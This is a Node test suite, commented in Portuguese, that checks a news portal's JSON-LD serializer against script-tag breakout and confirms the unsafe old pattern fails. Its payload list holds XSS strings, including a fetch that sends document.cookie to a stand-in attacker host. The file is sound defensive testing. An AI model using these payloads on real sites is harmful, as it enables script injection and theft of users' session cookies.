/**
 * Prova de que uma entrada maliciosa no JSON-LD NÃO executa e NÃO quebra
 * o JSON-LD para o crawler.
 *
 * O que este teste realmente prova (e o que NÃO prova):
 *
 *  PROVA, por construção + asserção:
 *  - O corpo emitido não contém `<`, `>` ou `&` crus → por WHATWG HTML
 *    §13.2.5.8 um raw text element só é encerrado por `</script`, logo o
 *    elemento não pode ser fechado prematuramente nem markup injetado.
 *  - `JSON.parse` do corpo emitido devolve EXATAMENTE o objeto de entrada
 *    (round-trip byte-exato) → o crawler lê os mesmos dados.
 *  - As props reais do componente (`propsJsonLd`, o mesmo objeto que
 *    `components/JsonLd.tsx` espalha no `<script>`) são renderizadas pelo
 *    React de verdade (`react-dom/server`), e o HTML resultante é
 *    inspecionado como o browser o receberia.
 *  - O teste "O PADRÃO ANTIGO é detectably quebrado" prova que a
 *    asserção principal tem poder de discriminar: se o `propsJsonLd`
 *    voltar a `JSON.stringify` cru, o teste QUEBRA.
 *
 *  NÃO PROVA (e não deve ser exigido deste teste): que nenhum browser
 *  executa o payload. Isso é propriedade do parser HTML do engine, não
 *  do nosso código. O que demonstramos é a condição necessária e
 *  suficiente no nível de bytes — o conjunto de caracteres que o HTML
 *  permite terminar o elemento.
 */
import test from "node:test";
import assert from "node:assert/strict";
import { renderToStaticMarkup } from "react-dom/server";
import React from "react";

import "./hooks.mjs";
import { serializarJsonLd, corpoJsonLdSeguro, propsJsonLd } from "../lib/jsonld.ts";
import {
  newsArticleJsonLd,
  breadcrumbListJsonLd,
  organizationJsonLd,
  personJsonLd,
} from "../lib/schema.ts";

const PAYLOADS = [
  "</script><script>alert(1)</script>",
  '"><img src=x onerror=alert(1)>',
  "</SCRIPT ><script>alert(1)</script>",
  "</script\t><script>alert(1)</script>",
  "</script/>",
  "<!--</script>--><script>alert(1)</script>",
  "\u2028\u2029</script><script>alert(1)</script>",
  "</script><svg/onload=alert(1)>",
  "javascript:alert(1)",
  "'\"><iframe src=javascript:alert(1)>",
  "</script><script>fetch('//evil.tld?c='+document.cookie)</script>",
];

/** Renderiza o MESMO elemento que `components/JsonLd.tsx` renderiza. */
function renderJsonLd(dados) {
  const props = propsJsonLd(dados);
  if (!props) return null;
  return renderToStaticMarkup(React.createElement("script", props));
}

/** Extrai o corpo de um `<script type="application/ld+json">` do HTML. */
function extrairCorpo(html) {
  const abre = html.indexOf('type="application/ld+json"');
  if (abre === -1) return null;
  const inicio = html.indexOf(">", abre) + 1;
  const fim = html.indexOf("</script>", inicio);
  if (fim === -1) return null;
  return html.slice(inicio, fim);
}

test("payload malicioso não pode fechar o elemento <script>", () => {
  for (const payload of PAYLOADS) {
    const corpo = serializarJsonLd({ headline: payload });
    assert.equal(
      corpo.includes("<"),
      false,
      `corpo contém "<" para payload ${JSON.stringify(payload)}`,
    );
    assert.equal(corpo.includes(">"), false, `corpo contém ">" para ${JSON.stringify(payload)}`);
    assert.equal(corpo.includes("&"), false, `corpo contém "&" para ${JSON.stringify(payload)}`);
    // A sequência exata que encerra o elemento, em qualquer caixa:
    assert.equal(
      /<\/script/i.test(corpo),
      false,
      `corpo contém </script para ${JSON.stringify(payload)}`,
    );
    assert.equal(corpoJsonLdSeguro(corpo), true, `corpo não é JSON-LD seguro: ${corpo}`);
  }
});

test("JSON-LD continua válido para o crawler (round-trip byte-exato)", () => {
  for (const payload of PAYLOADS) {
    const entrada = {
      "@context": "https://schema.org",
      headline: payload,
      descricao: `Contexto antes ${payload} depois`,
      aninhado: { lista: [payload, 1, true, null] },
    };
    const saida = serializarJsonLd(entrada);
    assert.deepEqual(
      JSON.parse(saida),
      entrada,
      `round-trip alterou o valor para ${JSON.stringify(payload)}`,
    );
  }
});

test("nenhum par `</` existe dentro do corpo (regra de raw text do HTML)", () => {
  // Esta é a propriedade que um parser HTML CONFIRMA (verificada também com
  // um tokenizer independente — `html.parser` do Python, que trata raw
  // text conforme WHATWG HTML §13.2.5.8: o corpo de um `<script>` só é
  // encerrado pela sequência `</` seguida do nome da tag). Sem `</` no
  // corpo, nenhum parser — por mais tolerante que seja — encerra o
  // elemento cedo. É por isso que esta asserção basta e não é blacklist.
  for (const payload of PAYLOADS) {
    const html = renderJsonLd({ headline: payload });
    const corpo = extrairCorpo(html);
    assert.notEqual(corpo, null, "não encontrou o script de JSON-LD");
    assert.equal(corpo.includes("</"), false, `corpo contém "</" para ${JSON.stringify(payload)}`);
  }
});

test("o HTML renderizado tem exatamente um <script> e nenhum extra", () => {
  for (const payload of PAYLOADS) {
    const html = renderJsonLd({ headline: payload });
    assert.notEqual(html, null, "propsJsonLd recusou payload válido");
    // Uma abertura e um fechamento. Se houvesse breakout, haveria > 1 abertura.
    const aberturas = (html.match(/<script\b/gi) || []).length;
    const fechamentos = (html.match(/<\/script>/gi) || []).length;
    assert.equal(
      aberturas,
      1,
      `aberturas de <script> = ${aberturas} para ${JSON.stringify(payload)}`,
    );
    assert.equal(fechamentos, 1, `fechamentos de </script> = ${fechamentos}`);

    // Nenhuma tag injetada em nenhum ponto do HTML.
    assert.equal(/<img|<svg|<iframe|<script(?![^-])/i.test(html.replace(/^<script[^>]*>/, "").replace(/<\/script>$/, "")), false,
      `marcação injetada no corpo para ${JSON.stringify(payload)}`);

    // O corpo extraído do HTML (como o browser entregaria ao crawler)
    // é o mesmo que serializamos, e continua parseável.
    const corpo = extrairCorpo(html);
    assert.notEqual(corpo, null, "não encontrou o script de JSON-LD");
    assert.deepEqual(JSON.parse(corpo), { headline: payload });
  }
});

test("O PADRÃO ANTIGO é detectably quebrado — o teste discrimina", () => {
  // Prova de que este teste não é um "falso verde": se alguém voltar a
  // `dangerouslySetInnerHTML={{__html: JSON.stringify(x)}}`, a asserção
  // acima quebra. `</script>` cru atravessa e cria uma segunda abertura.
  const payload = "</script><script>alert(1)</script>";
  const htmlAntigo = renderToStaticMarkup(
    React.createElement("script", {
      type: "application/ld+json",
      dangerouslySetInnerHTML: { __html: JSON.stringify({ headline: payload }) },
    }),
  );
  const aberturas = (htmlAntigo.match(/<script\b/gi) || []).length;
  assert.equal(aberturas, 2, "o HTML antigo deveria conter 2 <script> (breakout confirmado)");
  assert.equal(corpoJsonLdSeguro(extrairCorpo(htmlAntigo) ?? ""), false);
});

test("os construtores reais de schema produzem JSON-LD íntegro sob ataque", () => {
  const casos = [
    () =>
      newsArticleJsonLd({
        id: 7,
        tipo: "item",
        titulo: PAYLOADS[0],
        categoria: PAYLOADS[1],
        timestamp: "2026-09-25T12:00:00Z",
        fontes: [
          { nome_fonte: PAYLOADS[2], url_fonte_original: "https://exemplo.com/a" },
          { nome_fonte: "G1", url_fonte_original: "javascript:alert(1)" },
        ],
      }),
    () => breadcrumbListJsonLd([{ nome: PAYLOADS[0], url: "https://exemplo.com" }]),
    () => personJsonLd({ id: 3, nome: PAYLOADS[1], url: "https://exemplo.com/autor/3" }),
    () => organizationJsonLd(),
  ];
  for (const construir of casos) {
    const dados = construir();
    // `articleSection: undefined` e chaves ausentes: JSON-LD válido é
    // sempre parseável, mesmo com o objeto original incompleto.
    const saida = serializarJsonLd(dados);
    assert.equal(corpoJsonLdSeguro(saida), true, saida);
    assert.deepEqual(JSON.parse(saida), JSON.parse(JSON.stringify(dados)));
  }
});

test("valores não serializáveis não derrubam o render", () => {
  assert.equal(serializarJsonLd(undefined), "");
  assert.equal(serializarJsonLd(() => {}), "");
  assert.equal(propsJsonLd(undefined), null);
  // BigInt lança em JSON.stringify — precisa virar null, não exceção.
  assert.equal(serializarJsonLd({ x: 1n }), "");
  const circular = { a: 1 };
  circular.self = circular;
  assert.equal(serializarJsonLd(circular), "");
  assert.equal(propsJsonLd(circular), null);
});

test("conteúdo legítimo não é alterado", () => {
  const benigno = {
    "@context": "https://schema.org",
    "@type": "NewsArticle",
    headline: "Reforma tributária entra em fase de regulamentação",
    author: { "@type": "Organization", name: "Portal BRD" },
  };
  assert.equal(
    serializarJsonLd(benigno),
    JSON.stringify(benigno),
    "HTML benigno deve sair byte-idêntico ao JSON.stringify",
  );
});
